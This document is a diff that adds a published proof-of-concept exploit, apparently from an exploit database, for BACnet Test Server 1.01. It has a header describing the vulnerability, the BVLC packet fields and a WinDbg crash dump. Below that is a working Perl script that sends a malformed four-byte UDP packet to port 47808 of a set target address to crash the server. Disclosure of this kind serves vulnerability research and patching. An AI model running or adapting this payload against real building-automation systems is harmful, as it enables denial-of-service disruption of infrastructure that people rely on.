@@ -1,0 +1,113 @@
+# Title: BACnet Test Server 1.01 - Remote Denial of Service (PoC)
+# Date: 2020-10-07
+# Author: LiquidWorm
+# Vendor: https://www.bac-test.com
+# Product link: https://sourceforge.com/projects/bacnetserver
+# CVE: N/A
+
+
+#!/usr/bin/perl
+#
+# BACnet Test Server 1.01 Remote Denial of Service Exploit
+#
+# 
+# Vendor: BACnet Interoperability Test Services, Inc.
+# Product web page: https://www.bac-test.com
+#                   https://sourceforge.com/projects/bacnetserver
+# Affected version: 1.01 (BACnet Stack Version 0.5.7)
+#
+# Summary: This is a simple BACnet Server aimed at developers who
+# want to explore or test their BACnet Client implementations of
+# the ASHRAE BACnet protocol. It is based on Steve Karg's fine
+# implementation of the BACnet Stack.
+#
+# Desc: The BACNet Test Server is vulnerable to a denial of service
+# (DoS) vulnerability when sending malformed BVLC Length UDP packet
+# to port 47808 causing the application to crash.
+#
+# Type - 0x81
+# BVLC Function
+# - 0x01 - Write Broadcast Distribution Table
+# - 0x02 - Read Broadcast Distribution Table
+# - 0x03 - Read Broadcast Distribution Table ACK
+# - 0x04 - Forwarded NPDU with optional Originating Device IP address and Port included in BVLL header
+# - 0x05 - Register Foreign Device with expiration timeout (Time-to-live) in seconds
+# - 0x0a - Original-Unicast-NPDU used to send directed NPDUs to another BACnet/IP device or router.
+#   Optional Originating Device IP address and Port NOT included in BVLL header.
+# - 0x0b - Original-Broadcast-NPDU used by devices (except foreign devices) to broadcast messages on B/IP networks.
+# - 0x0c - Secure-BVLL
+# - BVLL Length
+# - IP address of Originating Device - optional depending on BVLC Function Code
+# - Port number of Originating Device - optional depending on BVLC Function Code
+# - NPDU - Network Layer Protocol Data Unit
+#
+# =================================================================
+# (67c.2f34): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# *** WARNING: Unable to verify checksum for C:\Program Files (x86)\BACnet Interoperability Testing Services, Inc\BACnet Server\Server.exe
+# eax=00600000 ebx=00692000 ecx=009bd796 edx=005fee00 esi=005fec04 edi=005fed00
+# eip=00994313 esp=005fec04 ebp=005fed00 iopl=0         nv up ei pl nz ac pe nc
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
+# Server+0x34313:
+# 00994313 8810            mov     byte ptr [eax],dl          ds:002b:00600000=?? 
+# 0:000> d 994313 +77
+# 0099438a cccccccc
+# 0099438e cccccccc
+# 00994392 cccccccc
+# 00994396 cccccccc
+# 0099439a cccccccc
+# 0:000> d esp
+# 005fec04 005ff3f8
+# 005fec08 005ff408
+# 005fec0c 00692000
+# 005fec10 cccccccc
+# 005fec14 cccccccc
+# 004fec18 cccccccc
+# =================================================================
+#
+# Tested on: Microsoft Windows 10 Professional (EN)
+#            Microsoft Windows 7 Professional SP1 (EN)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2020-5597
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5597.php
+#
+#
+# 05.08.2019
+#
+
+use strict;
+use warnings;
+use IO::Socket::INET;
+
+my $target = "10.0.99.34";
+my $porta = 47808;
+my $proto = "udp";
+my $stype = SOCK_DGRAM;
+my $timeout = 1;
+
+my $socket = new IO::Socket::INET (
+PeerHost => $target,
+PeerPort => $porta,
+Proto => $proto,
+Type => $stype,
+Timeout => $timeout
+) or die "Socket error. : $!\n";
+
+print "Connected to: $target:$porta\n";
+
+$| = 1;
+binmode $socket;
+
+my $data = "\x81\x09\xFF\xFE";
+
+print "Sending: $data [ ".length($data)." bytes ]\n";
+send ($socket, $data, 0) or die "Nope: $!\n";
+print "Done.\n";
+
+$socket->close();
